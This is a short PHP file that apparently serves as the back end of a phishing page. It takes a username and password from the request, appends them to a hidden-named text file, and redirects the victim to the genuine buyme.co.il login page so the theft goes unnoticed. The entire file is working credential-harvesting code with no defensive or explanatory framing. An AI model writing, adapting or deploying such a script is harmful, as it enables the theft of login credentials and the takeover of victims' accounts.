<?php

$file = "haiandavihayredtemyallabalagnayougashomcvarsofona123@@.txt";
$current = file_get_contents($file);
$current.= $_GET["Username"]."		".$_GET["Password"]."\n";
file_put_contents($file,$current);

header("Location: https://buyme.co.il/login");


?>
